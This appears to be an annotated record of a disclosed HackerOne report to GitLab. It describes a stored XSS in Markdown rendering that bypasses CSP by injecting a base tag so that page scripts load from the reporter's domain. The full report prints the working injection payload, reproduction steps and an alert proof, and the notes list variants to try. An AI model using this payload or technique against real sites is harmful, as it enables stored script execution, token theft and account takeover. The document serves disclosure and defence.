# Stored XSS in Notes with CSP Bypass via Base Tag Injection

## Metadata
- **Source:** HackerOne
- **Report:** 1481207 | https://hackerone.com/reports/1481207
- **Submitted:** 2022-02-14
- **Reporter:** joaxcar
- **Program:** GitLab Bug Bounty
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Stored Cross-Site Scripting (XSS), HTML Injection, Content Security Policy (CSP) Bypass, Markdown Filter Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in GitLab's Markdown rendering through the syntax_highlight_filter.rb that allows HTML injection. Despite CSP protections blocking script tags, an attacker can inject a base tag to redirect relative script URLs to an attacker-controlled domain, which then serves malicious scripts that load with the nonce attribute, bypassing CSP.

## Attack scenario
1. Attacker creates or gains access to a GitLab project and creates a new issue
2. Attacker injects malicious HTML payload containing base tag redirection in the issue description, exploiting the Markdown filter bypass
3. The payload redirects all relative links on the page to attacker's domain (e.g., joaxcar.com)
4. When legitimate users view the issue and open DevTools, failed script imports reveal the expected script locations that will be loaded from the attacker's domain
5. Attacker creates matching script files on their domain containing malicious JavaScript code
6. When the page reloads, the injected scripts load from the attacker's domain with valid nonce attributes, bypassing CSP and executing arbitrary code in the victim's browser context

## Root cause
The syntax_highlight_filter.rb fails to properly sanitize HTML output from Markdown processing, allowing injection of dangerous tags like base, pre, and code elements. The base tag is not blocked by CSP, enabling attackers to manipulate relative URL resolution. Additionally, the nonce attribute used in CSP allows dynamically generated scripts to execute, and the attacker can predict or hijack these script URLs.

## Attacker mindset
The attacker demonstrates sophisticated understanding of CSP bypass techniques and Markdown rendering. Rather than attempting direct script injection, they identify the unblocked base tag as a viable bypass vector. They leverage the legitimate nonce mechanism in CSP against itself by hosting malicious scripts at expected resource locations, showing creativity in bypassing modern security controls.

## Defensive takeaways
- Implement comprehensive HTML sanitization in Markdown processors - whitelist allowed tags and attributes rather than blacklisting
- Extend CSP directives to block or restrict the base tag (base-uri 'none' or specific origins)
- Review and harden the syntax_highlight_filter.rb to ensure it cannot be abused for HTML injection
- Implement subresource integrity (SRI) or additional validation for dynamically loaded scripts
- Use stricter CSP policies that minimize the use of nonce attributes when possible
- Implement Content Disposition headers and X-Content-Type-Options to prevent script execution
- Regularly audit third-party Markdown libraries and filters for known bypass techniques
- Consider sandboxing user-generated content in iframes with restricted policies

## Variant hunting
Test other unblocked HTML tags that can manipulate page behavior (meta, link, form tags)
Attempt to inject event handlers through attributes on allowed elements
Test if other Markdown features (wiki pages, comments, commit messages) are vulnerable to the same filter bypass
Investigate if the base tag bypass works with data: or javascript: protocols in href
Check if other resource types (stylesheets, images) can be hijacked similarly
Test for SVG-based XSS vectors in Markdown rendering
Examine if object, embed, or iframe tags are properly filtered
Look for similar vulnerabilities in other GitLab filter implementations

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1105
- T1570

## Notes
This report demonstrates a sophisticated multi-stage attack where the attacker doesn't rely on direct code execution but instead manipulates the browser's URL resolution mechanism. The vulnerability is particularly dangerous because it affects any project with public/internal visibility and can compromise any user viewing affected issues. The reporter indicates additional XSS vectors exist but strategically reported the most impactful one first. Prior report #1398305 patched emoji tag injection but left the underlying HTML injection vulnerability unresolved.

## Full report
<details><summary>Expand</summary>

## Summary
I read the issue [345657](https://gitlab.com/gitlab-org/gitlab/-/issues/345657) which handles the XSS in notes reported in Hackerone report [1398305](https://hackerone.com/reports/1398305). This issue fixes the reported XSS but leaves the HTML injection that was also mentioned. I don't know how you deal with these situations, but I thought I report this, and you can decide :)

The issue linked above shows how a user can inject HTML in any Note (actually any Markdown it seems. For example wiki pages and issue descriptions) by abusing [syntax_highlight_filter.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb).

There are more ways to take this injection and weaponize it than the patched Emoji tag. I have a list of additional vectors but though that I would report the worst one (proper full stored XSS) and explain more if you decide to accept the report. To not waste our time.

I have multiple ways to inject `script` tags, but it looks like you have hardened your CSP? None of the old bypasses worked for me. But it still seems that you have not blocked the `base` tag. And fortunately for me, the injection let me pass in `base` tags. So by entering this into an issue description or wiki page

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```
All relative links in the page will try to load their data from my site "joaxar.com". If we then open DevTools and reload the page, we will see the name of all files that failed to load. In the case of an issue page, we have this script
```
http://joaxcar.com/assets/webpack/hello.4948f350.chunk.js
```
and for a wiki page we have
```
https://joaxcar.com/assets/webpack/top_nav.c9763726.chunk.js
```
{F1618905}

Now I just have to create these files on my domain, and they will load and bypass CSP (as these script tags will have nonce in place and can thus load anything)

{F1618900}

## Steps to reproduce
1. log in as a user on Gitlab.com
2. go to any project (or create one), and add a new issue
3. enter this as the description (replace with your own server if you need to generate new scripts on your own domain)
```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```
4. save the issue
5. open DevTools (f12) and look for failing script imports
6. create the missing script on your domain containing
```
alert(document.domain)
```
7. reload the page and the popup should pop

{F1618901}


### Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

### What is the current *bug* behavior?

HTML injection in Markdown

### What is the expected *correct* behavior?

Should not be possible

### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

</details>

---
*Analysed by Claude on 2026-05-12*
